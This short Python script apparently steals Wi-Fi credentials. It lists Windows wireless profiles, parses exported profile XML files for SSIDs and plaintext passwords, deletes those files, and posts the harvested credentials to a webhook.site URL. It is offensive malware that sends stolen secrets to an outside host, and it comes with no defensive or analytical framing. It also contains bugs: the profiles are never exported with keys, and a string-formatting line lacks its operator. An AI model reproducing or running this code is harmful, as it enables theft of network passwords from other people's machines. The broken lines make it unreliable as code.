import os
import requests
import subprocess
import xml.etree.ElementTree as ET

url = 'https://webhook.site/8d6e4cf6-811c-4793-bc36-cc9ffb35459e'

wifi_files = []
payload = {'SSID': [], 'Password': []}

get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

for file in wifi_files:
    tree = ET.parse(file)
    root = tree.getroot()
    SSID = root[0].text
    password = root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(password)
    os.remove(file)

payload_str = ' & '.join("%s=%s "(k, v) for k, v in payload.items())
requests.post(url, params='format=json', data=payload_str)
